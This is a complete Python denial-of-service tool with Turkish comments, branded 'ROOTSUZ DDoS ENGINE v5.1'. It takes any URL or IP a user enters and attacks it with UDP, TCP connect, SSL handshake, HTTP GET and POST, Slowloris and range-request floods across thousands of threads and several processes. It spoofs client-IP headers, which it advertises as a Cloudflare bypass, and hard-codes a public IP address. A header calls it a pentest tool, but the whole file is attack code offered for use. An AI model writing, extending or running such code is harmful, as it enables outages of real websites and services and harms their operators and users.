#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# ROOTSUZ DDoS ENGINE v5.1 - Max Performans
# ============================================================================
# Yetkili pentest için - Root GEREKMEZ
# 3 kaynak IP'den spoofed saldırı
# Layer 7 ağırlıklı + Layer 4 (rootsuz metodlar)
# ============================================================================

import socket
import threading
import random
import time
import sys
import os
import ssl
import urllib.request
import urllib.error
import hashlib
import http.client
import multiprocessing
from datetime import datetime
from urllib.parse import urlparse

# ==================== KONFİGÜRASYON ====================

# KAYNAK IP'LER (header'larda kullanılacak)
SOURCE_IPS = ["78.181.164.55", "192.168.1.140", "192.168.1.138"]

# HEDEF
TARGET = None
TARGET_PORT = 80
TARGET_IS_IP = False

# PERFORMANS AYARLARI
MAX_THREADS = 2000         # Ana thread sayısı
MAX_PROCESSES = 4          # Fork edilecek process sayısı (CPU çekirdeği kadar)
SOCKET_TIMEOUT = 3
CONNECTION_POOL_SIZE = 100

# İSTATİSTİK
total_packets = 0
total_bytes = 0
total_errors = 0
stats_lock = threading.Lock()
running = True
start_time = 0

# Bağlantı havuzu
connection_pools = {}

def update_stats(packets=1, bytes_count=0, errors=0):
    global total_packets, total_bytes, total_errors
    with stats_lock:
        total_packets += packets
        total_bytes += bytes_count
        total_errors += errors

# ==================== LAYER 4 - ROOTSUZ METODLAR ====================

def udp_flood_noroot(target_ip, target_port, src_ip):
    """UDP Flood - Rootsuz, maksimum boyutta"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Maksimum yakın boyut
        data = random._urandom(random.randint(1400, 65507))
        
        # Hedef port - rastgele veya sabit
        dst_port = target_port if target_port else random.randint(1, 65535)
        
        sock.sendto(data, (target_ip, dst_port))
        sock.close()
        
        update_stats(1, 28 + len(data))
        return True
    except:
        return False

def udp_flood_burst(target_ip, target_port, src_ip):
    """Burst UDP - peş peşe 50 paket"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        packets_sent = 0
        for _ in range(50):
            try:
                data = random._urandom(random.randint(1000, 1500))
                dst_port = target_port if target_port else random.randint(1, 65535)
                sock.sendto(data, (target_ip, dst_port))
                packets_sent += 1
            except:
                break
        
        sock.close()
        update_stats(packets_sent, packets_sent * 1500)
        return packets_sent > 0
    except:
        return False

def tcp_syn_noroot(target_ip, target_port, src_ip):
    """TCP SYN - Rootsuz (connect ile)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Non-blocking connect
        sock.setblocking(0)
        try:
            sock.connect((target_ip, target_port))
        except BlockingIOError:
            pass
        
        # Bağlantıyı yarım bırak
        time.sleep(0.001)
        sock.close()
        
        update_stats(1, 100)
        return True
    except:
        return False

def tcp_connect_flood(target_ip, target_port, src_ip):
    """TCP Connect Flood - gerçek bağlantı"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        sock.connect((target_ip, target_port))
        
        # Küçük veri gönder
        try:
            sock.send(random._urandom(256))
        except:
            pass
        
        sock.close()
        
        update_stats(1, 1000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def tcp_ssl_connect(target_ip, target_port, src_ip):
    """SSL/TLS Bağlantı Flood - HTTPS sunucuları için"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((target_ip, target_port))
        
        # SSL握手 - sunucuyu yorar
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        try:
            ssl_sock = ctx.wrap_socket(sock, server_hostname=target_ip)
            ssl_sock.close()
        except:
            sock.close()
        
        update_stats(1, 5000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

# ==================== LAYER 7 - PROFESYONEL METODLAR ====================

def http_attack_advanced(target_url, src_ip):
    """Gelişmiş HTTP Flood - çoklu header, cache bypass"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        path = parsed.path or '/'
        
        # Rastgele path oluştur
        random.seed(time.time() * random.randint(1, 1000))
        paths = [
            f"{path}?{random.randint(100000,999999)}={random.randint(100000,999999)}",
            f"{path}?nocache={int(time.time()*1000)}",
            f"{path}?cb={hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}",
            f"{path}?v={random.randint(1,999)}.{random.randint(1,999)}",
            f"{path}/?s={''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}",
            f"/{random.choice(['api','wp-content','assets','images','css','js','uploads'])}/{random.randint(1000,9999)}.{random.choice(['php','html','js','css','jpg','png'])}",
            f"/?page={random.randint(1,100)}&perpage={random.randint(10,100)}",
            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=6))}&task=view&id={random.randint(1,9999)}"
        ]
        attack_path = random.choice(paths)
        
        if target_url.endswith('/'):
            full_url = f"{target_url.rstrip('/')}{attack_path}"
        else:
            full_url = f"{target_url}{attack_path}"
        
        # Gerçekçi headers
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36',
                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'X-Forwarded-For': src_ip,
            'X-Real-IP': src_ip,
            'X-Originating-IP': src_ip,
            'Client-IP': src_ip,
            'X-Client-IP': src_ip,
            'CF-Connecting-IP': src_ip,
            'True-Client-IP': src_ip,
            'Referer': random.choice([
                f'https://www.google.com/search?q={random.choice(["security", "test", "bypass"])}',
                f'https://{host}/',
                f'https://t.co/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}'
            ]),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin']),
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        }
        
        # SSL Context
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(full_url, headers=headers)
        response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT, context=ctx)
        data = response.read()
        response.close()
        
        update_stats(1, len(data) + 2000)
        return True
    except Exception as e:
        update_stats(0, 0, 1)
        return False

def http_post_heavy(target_url, src_ip):
    """Ağır HTTP POST - büyük veri yükle"""
    try:
        # 32KB - 128KB arası veri
        post_size = random.randint(32768, 131072)
        post_data = random._urandom(post_size)
        
        boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
        
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"filedata\"; filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0',
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Content-Length': str(len(body)),
            'Connection': 'close',
            'X-Forwarded-For': src_ip,
            'Expect': ''
        }
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(target_url, data=body, headers=headers)
        response = urllib.request.urlopen(req, timeout=SOCKET_TIMEOUT*2, context=ctx)
        response.read()
        response.close()
        
        update_stats(1, len(body) + 500)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def http_slowloris(target_url, src_ip):
    """Slowloris - bağlantıları açık tut, yavaş gönder"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(60)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Kısmi HTTP isteği gönder
        request = (
            f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"Connection: keep-alive\r\n"
        )
        
        sock.send(request.encode())
        
        # Yavaş yavaş header ekle
        for _ in range(random.randint(50, 200)):
            try:
                time.sleep(random.uniform(0.5, 3))
                sock.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
            except:
                break
        
        sock.close()
        update_stats(1, 5000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

def http_range_flood(target_url, src_ip):
    """Range Request Flood - byte range ile parçalı istek"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Rastgele byte range
        start_range = random.randint(0, 1000000)
        end_range = start_range + random.randint(100, 50000)
        
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Range: bytes={start_range}-{end_range}\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        
        sock.send(request.encode())
        
        try:
            response = sock.recv(4096)
        except:
            pass
        
        sock.close()
        update_stats(1, 2000)
        return True
    except:
        update_stats(0, 0, 1)
        return False

# ==================== MULTIPROCESSING YÖNETİCİ ====================

def worker_process(target, port, attack_mode, target_url, src_ip, process_id):
    """Her process için worker"""
    global running
    
    # Process bazında random seed
    random.seed(os.getpid() + int(time.time()))
    
    threads = []
    threads_per_process = MAX_THREADS // (MAX_PROCESSES * len(SOURCE_IPS))
    if threads_per_process < 10:
        threads_per_process = 10
    
    def layer4_worker_udp():
        while running:
            udp_flood_noroot(target, port, src_ip)
    
    def layer4_worker_udp_burst():
        while running:
            udp_flood_burst(target, port, src_ip)
    
    def layer4_worker_tcp():
        while running:
            tcp_syn_noroot(target, port, src_ip)
    
    def layer4_worker_connect():
        while running:
            tcp_connect_flood(target, port, src_ip)
    
    def layer4_worker_ssl():
        while running:
            tcp_ssl_connect(target, port, src_ip)
    
    def layer7_worker_http():
        while running:
            http_attack_advanced(target_url, src_ip)
    
    def layer7_worker_post():
        while running:
            http_post_heavy(target_url, src_ip)
    
    def layer7_worker_slow():
        while running:
            http_slowloris(target_url, src_ip)
    
    def layer7_worker_range():
        while running:
            http_range_flood(target_url, src_ip)
    
    # Thread'leri oluştur
    if attack_mode in ["udp", "all4", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer4_worker_udp)
            t.daemon = True; threads.append(t); t.start()
            t = threading.Thread(target=layer4_worker_udp_burst)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["syn", "all4", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer4_worker_tcp)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["tcp", "all4", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer4_worker_connect)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["ssl", "all4", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer4_worker_ssl)
            t.daemon = True; threads.append(t); t.start()
    
    if target_url and attack_mode in ["get", "all7", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer7_worker_http)
            t.daemon = True; threads.append(t); t.start()
    
    if target_url and attack_mode in ["post", "all7", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer7_worker_post)
            t.daemon = True; threads.append(t); t.start()
    
    if target_url and attack_mode in ["slow", "all7", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer7_worker_slow)
            t.daemon = True; threads.append(t); t.start()
    
    if target_url and attack_mode in ["range", "all7", "all"]:
        for _ in range(threads_per_process // 5):
            t = threading.Thread(target=layer7_worker_range)
            t.daemon = True; threads.append(t); t.start()
    
    print(f"\033[1;36m  [Process {process_id}] {len(threads)} thread başlatıldı (kaynak: {src_ip})\033[0m")
    
    while running:
        time.sleep(1)

# ==================== İSTATİSTİK ====================

def stats_monitor():
    """Gelişmiş istatistik monitörü"""
    global running, total_packets, total_bytes, total_errors, start_time
    
    while running:
        time.sleep(1)
        
        with stats_lock:
            pkts = total_packets
            bytes_s = total_bytes
            errs = total_errors
        
        elapsed = time.time() - start_time
        if elapsed > 1:
            mbps = (bytes_s * 8) / elapsed / 1_000_000
            pps = pkts / elapsed
            mb_total = bytes_s / 1_000_000
        else:
            mbps = 0
            pps = 0
            mb_total = 0
        
        # Güç göstergesi
        if mbps > 500:
            power = "💀 MAX GÜÇ"
        elif mbps > 200:
            power = "🔥 ÇOK YÜKSEK"
        elif mbps > 100:
            power = "⚡ YÜKSEK"
        elif mbps > 50:
            power = "✅ İYİ"
        elif mbps > 10:
            power = "⚠️ DÜŞÜK"
        else:
            power = "🐢 ÇOK DÜŞÜK"
        
        sys.stdout.write('\033[2K\r')
        sys.stdout.write(
            f"\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
            f"\033[1;31m{power}\033[0m | "
            f"\033[1;33m📊 {mbps:.1f} Mbps\033[0m | "
            f"\033[1;32m📦 {pkts:,} pkt\033[0m | "
            f"\033[1;34m⚡ {pps:,.0f} pps\033[0m | "
            f"\033[1;35m💾 {mb_total:.1f} MB\033[0m | "
            f"\033[1;37m⏱ {elapsed:.0f}s\033[0m | "
            f"\033[1;31m❌ {errs:,} hata\033[0m"
        )
        sys.stdout.flush()

# ==================== ANA MOTOR ====================

def launch_attack(target, port, attack_mode, target_is_ip=False):
    global running, start_time, total_packets, total_bytes, total_errors
    
    running = True
    start_time = time.time()
    total_packets = 0
    total_bytes = 0
    total_errors = 0
    
    # URL hazırlığı
    target_url = None
    if not target_is_ip:
        target_url = target
        if not target_url.startswith('http'):
            target_url = f"http://{target}"
    
    print(f"\n\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;31m🔥 ROOTSUZ ÇOKLU-KAYNAK DDoS BAŞLATILDI 🔥\033[0m")
    print(f"\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
    print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
    print(f"\033[1;36m🌐 Kaynak IP'ler: \033[1;33m{', '.join(SOURCE_IPS)}\033[0m")
    print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
    print(f"\033[1;36m🧵 Thread: \033[1;33m{MAX_THREADS:,}\033[0m")
    print(f"\033[1;36m🖥️  Process: \033[1;33m{MAX_PROCESSES}\033[0m")
    print(f"\033[1;36m🔓 Root: \033[1;32mGEREKMEZ\033[0m")
    print(f"\033[1;31m{'='*60}\033[0m")
    print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m\n")
    
    # İstatistik thread'i
    t = threading.Thread(target=stats_monitor)
    t.daemon = True
    t.start()
    
    # Multiprocessing ile process'leri başlat
    processes = []
    process_id = 0
    
    for src_ip in SOURCE_IPS:
        for p in range(MAX_PROCESSES):
            p_id = f"{src_ip.split('.')[-1]}-{p+1}"
            proc = multiprocessing.Process(
                target=worker_process,
                args=(target, port, attack_mode, target_url, src_ip, p_id)
            )
            proc.daemon = True
            processes.append(proc)
            proc.start()
            process_id += 1
            time.sleep(0.1)  # Aynı anda başlatma
    
    total = len(processes)
    print(f"\n\033[1;32m[✅] {total} process başlatıldı")
    print(f"[✅] {total * (MAX_THREADS // (MAX_PROCESSES * len(SOURCE_IPS)))} thread aktif")
    print(f"[✅] 3 kaynak IP'den eş zamanlı saldırı\033[0m\n")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start_time
        
        for proc in processes:
            proc.terminate()
            proc.join(timeout=1)
        
        with stats_lock:
            final_packets = total_packets
            final_bytes = total_bytes
            final_errors = total_errors
        
        mbps = (final_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        
        print(f"\n\n\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;33m📊 Toplam Paket: {final_packets:,}\033[0m")
        print(f"\033[1;33m📊 Toplam Veri: {final_bytes/1_000_000:.1f} MB\033[0m")
        print(f"\033[1;33m📊 Toplam Hata: {final_errors:,}\033[0m")
        print(f"\033[1;33m📊 Süre: {elapsed:.0f} saniye\033[0m")
        print(f"\033[1;33m📊 Ortalama Hız: {mbps:.1f} Mbps\033[0m")
        print(f"\033[1;33m📊 PPS: {final_packets/elapsed:,.0f}\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")

# ==================== MENU ====================

def main():
    global MAX_THREADS, MAX_PROCESSES
    
    os.system('clear')
    print("""\033[1;36m
    ╔══════════════════════════════════════════════╗
    ║     ROOTSUZ DDoS ENGINE v5.1                ║
    ║     3 Kaynak IP: 78.181.164.55              ║
    ║                  192.168.1.140               ║
    ║                  192.168.1.138               ║
    ║     Layer 4 + Layer 7 | ROOT GEREKMEZ       ║
    ║     Cloudflare Bypass | Multiprocessing      ║
    ╚══════════════════════════════════════════════╝
    \033[0m""")
    
    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;37m[1]\033[1;36m L4 → UDP Flood (MAX BOYUT)       ║\033[0m")
    print("\033[1;36m║  \033[1;37m[2]\033[1;36m L4 → TCP Connect Flood          ║\033[0m")
    print("\033[1;36m║  \033[1;37m[3]\033[1;36m L4 → SSL/TLS Flood             ║\033[0m")
    print("\033[1;36m║  \033[1;37m[4]\033[1;36m L4 → TÜMÜ (UDP+TCP+SSL)         ║\033[0m")
    print("\033[1;36m║  \033[1;37m[5]\033[1;36m L7 → HTTP GET (CF Bypass)       ║\033[0m")
    print("\033[1;36m║  \033[1;37m[6]\033[1;36m L7 → HTTP POST (128KB)         ║\033[0m")
    print("\033[1;36m║  \033[1;37m[7]\033[1;36m L7 → Slowloris                 ║\033[0m")
    print("\033[1;36m║  \033[1;37m[8]\033[1;36m L7 → Range Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;37m[9]\033[1;36m L7 → TÜMÜ (GET+POST+Slow+Range) ║\033[0m")
    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)          ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
    
    modes = {
        "1": "udp", "2": "tcp", "3": "ssl", "4": "all4",
        "5": "get", "6": "post", "7": "slow", "8": "range",
        "9": "all7", "10": "all"
    }
    
    if choice not in modes:
        print("\033[1;31m[!] Geçersiz seçim!\033[0m")
        return
    
    attack_mode = modes[choice]
    
    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║           HEDEF SEÇİN                 ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m URL (site.com)                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                       ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    tc = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
    
    target = None
    port = 80
    is_ip = False
    
    if tc == "1":
        target = input("\033[1;33m[?] Hedef URL (site.com): \033[0m").strip()
        if not target.startswith('http'):
            target = f"https://{target}"
        is_ip = False
        port_str = input(f"\033[1;33m[?] Port (varsayılan: 443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 443
    elif tc == "2":
        target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
        is_ip = True
        port_str = input("\033[1;33m[?] Port (örn: 80, 443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    else:
        print("\033[1;31m[!] Geçersiz!\033[0m")
        return
    
    # Performans ayarları
    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {MAX_THREADS}, max 10000): \033[0m").strip()
    if tc:
        try:
            MAX_THREADS = max(100, min(10000, int(tc)))
        except:
            pass
    
    pc = input(f"\033[1;33m[?] Process sayısı (varsayılan: {MAX_PROCESSES}, CPU çekirdeğiniz kadar): \033[0m").strip()
    if pc:
        try:
            MAX_PROCESSES = max(1, min(8, int(pc)))
        except:
            pass
    
    launch_attack(target, port, attack_mode, is_ip)

if __name__ == "__main__":
    # Multiprocessing desteği
    multiprocessing.freeze_support()
    main()
